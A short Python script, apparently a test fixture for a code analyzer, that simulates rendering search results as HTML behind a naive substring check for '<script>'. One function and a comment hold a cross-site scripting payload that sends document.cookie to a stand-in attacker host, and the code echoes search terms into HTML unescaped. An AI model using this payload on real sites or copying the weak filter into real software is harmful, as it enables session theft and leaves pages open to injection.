OR = "OR"
CASE_SENSITIVE = "Sensitive"
SCRIPT_PAT = ['<', 's', 'c', 'r', 'i', 'p','t', '>']

# eliminates the file open read and string find operations.

# little helper
def lst_to_str(lst):
#    print(lst)
    l = len(lst)
    i = 0
    res_str =""
    while(i<l):
        res_str = res_str + lst[i]
        i = i+1
    return res_str
    
# small script searcher
def issubstring(s, p):
	   i = 0
	   while i <= len(s) - len(p):
	       j = i
	       for c in p:
	           if c != s[j]:
	               break
	           else:
	               j = j+1
	               if j - i == len(p):
	                   return True
	       i = i+1
	   return False

# simple tiny part to simulate santinization process
def santinize_proc(lst):
    return issubstring(lst, SCRIPT_PAT)

# proc_results :: [term] -> [()] -> IO (as ordered list in
# search_results division of the page
def proc_results(terms, results):
#    terms = parseTerms(terms)
 #   print(terms)

    is_valid = santinize_proc(terms)
    if is_valid:
        print("failed because of script")
        return -1
        #raise("no script allowed")
        
    print("<div id= \"search_results\">\n<ol>)")
    l = len(results)
    if l==0:
        print("<h3>Your search did not return any results.</h3>" + lst_to_str(terms))
    indx = 0
    while indx < l: 
        #if indx % 2 == 1:
           # indx = indx + 1
         #   continue
        print("<li <a href=\"test/" + results[indx][1] + "?search=true&term=" + lst_to_str(terms) +"\">")
        print(results[indx][0] + "</a>\n")
        indx = indx + 1
    print("</ol>\n</div>\n")


def test_init_input():
#    global simulated_cgi_entry
#    global test_res
#    simulated_cgi_entry =
    simulated_cgi_entry1 = {"terms": ["red", "blue","three"], "boolean" : OR, 
                         "case": CASE_SENSITIVE,
                         "files": ['colors.html', 'numbers.html', 'numbersandcolors.html', 'numbersandcolorswithtag.html']}
    res =  [("Colors", 'colors.html'),
            ("Numbers", 'numbers.html'),
            ("Numbers and Colors", "numbersandcolors.html"),
            ("Numbers and Colors With Tag", "numbersandcolorswithtag.html")]
    return (simulated_cgi_entry1["terms"], res)
def default_mal_strlst ():
	return ['r', 'e', 'd', ' ', 'b', 'l', 'u', 'e', ' ', 't', 'h', 'r', 'e', 'e', ' ', 'h', 't', 't', 'p', ':', '/', '/', 'v', 'i', 'c', 't', 'i', 'm', '.', 'c', 'o', 'm', '/', 'p', 'o', 's', 't', '.', 'p', 'h', 'p', '?', 's', '=', '<', 's', 'c', 'r', 'i', 'p', 't', '>', 'd', 'o', 'c', 'u', 'm', 'e', 'n', 't', '.', 'l', 'o', 'c', 'a', 't', 'i', 'o', 'n', '=', "'", 't', 'r', 'u', 'd', 'y', 's', 'e', 'r', 'v', 'e', 'r', '.', 'c', 'o', 'm', '/', 'b', 'a', 'd', '.', 'p', 'h', 'p', '?', "'", ' ', '+', ' ', 'd', 'o', 'c', 'u', 'm', 'e', 'n', 't', '.', 'c', 'o', 'o', 'k', 'i', 'e', '<', '/', 's', 'c', 'i', 'p', 't', '>']


def gen_malicious_input():
#    global simulated_cgi_entry
    simulated_cgi_entry2 = {"terms": default_mal_strlst()}
    res = []
    return (simulated_cgi_entry2["terms"], res)
    #simulated_cgi_entry["terms"] = "red blue three http://victim.com/post.php?s=<script>document.location='trudyserver.com/bad.php?' + document.cookie</scipt>" 

    
test1= test_init_input()
# for analyzer testing to check literal values
input1 = test1[0]
input2 = test1[1]
proc_results(input1, input2)

print("-------------------------------")

test2 = gen_malicious_input()
# for analyzer testing to check literal values
input3 = test2[0]
input4 = test2[1]
proc_results(input3, input4)


